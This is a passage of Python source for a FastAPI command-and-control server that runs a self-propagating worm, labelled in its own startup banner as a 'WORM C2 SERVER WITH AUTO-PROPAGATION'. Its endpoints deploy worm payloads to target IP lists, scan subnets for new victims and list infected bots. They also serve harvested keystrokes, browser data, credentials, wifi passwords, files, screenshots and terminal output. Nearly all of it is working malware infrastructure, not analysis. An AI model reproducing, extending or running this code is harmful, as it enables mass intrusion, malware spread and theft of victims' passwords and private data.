    worm_engine.start()
    
    return {"status": "auto-propagation started"}

@app.post("/api/worm/propagation/stop")
async def stop_auto_propagation(username: str = Depends(authenticate)):
    """Stop automatic worm propagation"""
    propagation_rules["default"]["enabled"] = False
    PersistentStorage.save_json('propagation_rules.json', propagation_rules)
    worm_engine.stop()
    
    return {"status": "auto-propagation stopped"}

@app.get("/api/worm/propagation/rules")
async def get_propagation_rules(username: str = Depends(authenticate)):
    """Get propagation rules"""
    return propagation_rules

@app.post("/api/worm/propagation/rules")
async def update_propagation_rules(rules: AutoPropagationRule, username: str = Depends(authenticate)):
    """Update propagation rules"""
    propagation_rules[rules.rule_id] = rules.dict()
    if rules.rule_id == "default":
        propagation_rules["default"] = rules.dict()
    
    PersistentStorage.save_json('propagation_rules.json', propagation_rules)
    
    return {"status": "rules updated", "rules": rules}

@app.get("/api/worm/tasks")
async def get_worm_tasks(
    status: Optional[str] = None,
    limit: int = 100,
    username: str = Depends(authenticate)
):
    """Get worm tasks"""
    tasks = list(worm_tasks.values())
    if status:
        tasks = [t for t in tasks if t["status"] == status]
    return sorted(tasks, key=lambda x: x["created_at"], reverse=True)[:limit]

@app.get("/api/worm/stats")
async def get_worm_stats(username: str = Depends(authenticate)):
    """Get worm statistics"""
    # Calculate additional stats
    active_infections = sum(1 for bot in bots.values() if bot.get("status") == "active")
    pending_tasks = len([t for t in worm_tasks.values() if t["status"] == "pending"])
    running_tasks = len([t for t in worm_tasks.values() if t["status"] == "running"])
    
    return {
        **worm_stats,
        "active_infections": active_infections,
        "pending_tasks": pending_tasks,
        "running_tasks": running_tasks,
        "total_tasks": len(worm_tasks),
        "harvested_credentials": len(worm_engine.harvested_credentials),
        "harvested_wifi": len(worm_engine.harvested_wifi),
        "timestamp": datetime.datetime.utcnow().isoformat()
    }

@app.post("/api/worm/deploy")
async def deploy_worm_payload(
    target_ips: List[str],
    worm_id: Optional[str] = None,
    payload_type: str = "standard",
    username: str = Depends(authenticate)
):
    """Manually deploy worm to targets"""
    if worm_id and worm_id not in worms:
        raise HTTPException(status_code=404, detail="Worm not found")
    
    worm_config = worms.get(worm_id, {"name": "manual_deploy", "version": "1.0"})
    
    deployed = []
    failed = []
    
    for ip in target_ips:
        task_id = f"manual_{ip}_{int(time.time())}"
        task = {
            "task_id": task_id,
            "worm_id": worm_id or "manual",
            "task_type": "propagate",
            "target_ip": ip,
            "payload_type": payload_type,
            "worm_config": worm_config,
            "status": "pending",
            "created_at": datetime.datetime.utcnow().isoformat()
        }
        worm_tasks[task_id] = task
        deployed.append(ip)
    
    PersistentStorage.save_json('worm_tasks.json', worm_tasks)
    
    return {
        "status": "deployment initiated",
        "deployed": deployed,
        "failed": failed,
        "task_count": len(deployed)
    }

@app.post("/api/worm/scan")
async def scan_network(
    network: str,
    ports: Optional[List[int]] = None,
    username: str = Depends(authenticate)
):
    """Scan network for potential targets"""
    if not ports:
        ports = propagation_rules["default"]["target_ports"]
    
    tasks_created = []
    
    for i in range(1, 255):
        target_ip = f"{network}.{i}"
        if target_ip in bots:
            continue
            
        task_id = f"scan_{target_ip}_{int(time.time())}"
        task = {
            "task_id": task_id,
            "worm_id": "manual_scan",
            "task_type": "scan",
            "target_ip": target_ip,
            "target_ports": ports,
            "status": "pending",
            "created_at": datetime.datetime.utcnow().isoformat()
        }
        worm_tasks[task_id] = task
        tasks_created.append(target_ip)
        
        # Limit to avoid overwhelming
        if len(tasks_created) >= 100:
            break
    
    PersistentStorage.save_json('worm_tasks.json', worm_tasks)
    
    return {
        "status": "scan initiated",
        "network": network,
        "targets": tasks_created,
        "count": len(tasks_created)
    }

@app.post("/api/worm/cleanup")
async def worm_cleanup(username: str = Depends(authenticate)):
    """Clean up old worm tasks and data"""
    now = datetime.datetime.utcnow()
    cutoff = now - datetime.timedelta(days=7)
    
    # Remove old completed tasks
    to_delete = []
    for task_id, task in worm_tasks.items():
        if task["status"] in ["completed", "failed"]:
            if "completed_at" in task:
                completed_time = datetime.datetime.fromisoformat(task["completed_at"])
                if completed_time < cutoff:
                    to_delete.append(task_id)
    
    for task_id in to_delete:
        del worm_tasks[task_id]
    
    # Clean old logs
    log_files = os.listdir(f"{DATA_DIR}/worm_logs")
    for log_file in log_files:
        file_path = f"{DATA_DIR}/worm_logs/{log_file}"
        if os.path.getmtime(file_path) < cutoff.timestamp():
            os.remove(file_path)
    
    PersistentStorage.save_json('worm_tasks.json', worm_tasks)
    
    return {
        "status": "cleanup completed",
        "tasks_removed": len(to_delete)
    }

# ==================== Dashboard Data Endpoints ====================

@app.get("/api/bots")
async def get_bots(username: str = Depends(authenticate)):
    now = datetime.datetime.utcnow()
    bot_list = []
    for ip, info in bots.items():
        last = datetime.datetime.fromisoformat(info["last_seen"])
        is_active = (now - last).seconds < 300
        bot_list.append({
            "ip": ip,
            "hostname": info.get("hostname", "unknown"),
            "username": info.get("username", "unknown"),
            "os_info": info.get("os_info", "unknown"),
            "last_seen": info["last_seen"],
            "first_seen": info.get("first_seen", info["last_seen"]),
            "status": "active" if is_active else "inactive",
            "worm_version": info.get("worm_version", "unknown")
        })
    return sorted(bot_list, key=lambda x: x["last_seen"], reverse=True)

@app.get("/api/keystrokes")
async def get_keystrokes(limit: int = 100, ip_filter: Optional[str] = None, username: str = Depends(authenticate)):
    if ip_filter:
        filtered = [log for log in keystroke_logs if log["ip"] == ip_filter]
    else:
        filtered = keystroke_logs
    return filtered[-limit:][::-1]

@app.get("/api/browser_data")
async def get_browser_data(limit: int = 50, username: str = Depends(authenticate)):
    return browser_logs[-limit:][::-1]

@app.get("/api/credentials")
async def get_credentials(limit: int = 50, username: str = Depends(authenticate)):
    return credential_logs[-limit:][::-1]

@app.get("/api/wifi_data")
async def get_wifi_data(limit: int = 50, username: str = Depends(authenticate)):
    return wifi_logs[-limit:][::-1]

@app.get("/api/files_data")
async def get_files_data(limit: int = 50, username: str = Depends(authenticate)):
    return file_logs[-limit:][::-1]

@app.get("/api/screenshots")
async def get_screenshots(limit: int = 20, username: str = Depends(authenticate)):
    return screenshot_logs[-limit:][::-1]

@app.get("/api/screenshot/{filename}")
async def get_screenshot(filename: str, username: str = Depends(authenticate)):
    file_path = f"{DATA_DIR}/screenshots/{filename}"
    if os.path.exists(file_path):
        return FileResponse(file_path)
    return {"error": "Not found"}

@app.get("/api/terminal_outputs")
async def get_terminal_outputs(ip: Optional[str] = None, username: str = Depends(authenticate)):
    if ip:
        return {ip: terminal_outputs.get(ip, [])}
    return terminal_outputs

@app.get("/api/plugins")
async def list_plugins(username: str = Depends(authenticate)):
    return plugins

@app.get("/api/stats")
async def get_stats(username: str = Depends(authenticate)):
    now = datetime.datetime.utcnow()
    active_bots = sum(1 for ip, info in bots.items() 
                     if (now - datetime.datetime.fromisoformat(info["last_seen"])).seconds < 300)
    
    return {
        "total_bots": len(bots),
        "active_bots": active_bots,
        "total_keystrokes": len(keystroke_logs),
        "total_browser": len(browser_logs),
        "total_credentials": len(credential_logs),
        "total_wifi": len(wifi_logs),
        "total_files": len(file_logs),
        "total_screenshots": len(screenshot_logs),
        "worm_stats": worm_stats,
        "uptime": time.time(),
        "environment": ENVIRONMENT
    }

@app.get("/api/current_credentials")
async def get_current_credentials(username: str = Depends(authenticate)):
    return {"username": USERNAME, "password": PASSWORD}

@app.post("/api/change_credentials")
async def change_credentials(
    new_username: str,
    new_password: str,
    username: str = Depends(authenticate)
):
    global USERNAME, PASSWORD
    USERNAME = new_username
    PASSWORD = new_password
    return {"status": "credentials updated"}

# ==================== Startup Banner ====================
@app.on_event("startup")
async def startup_event():
    print("\n" + "="*70)
    print("🚀 WORM C2 SERVER WITH AUTO-PROPAGATION STARTED")
    print("="*70)
    print(f"📍 Environment: {ENVIRONMENT}")
    print(f"📍 Data Directory: {DATA_DIR}")
    print(f"🔑 Username: {USERNAME}")
    print(f"🔑 Password: {PASSWORD}")
    print(f"📊 Total Bots: {len(bots)}")
    print(f"🧬 Worm Engine: {'ACTIVE' if worm_engine.running else 'INACTIVE'}")
    print(f"🔄 Auto-Propagation: {'ENABLED' if propagation_rules['default']['enabled'] else 'DISABLED'}")
    print("="*70 + "\n")

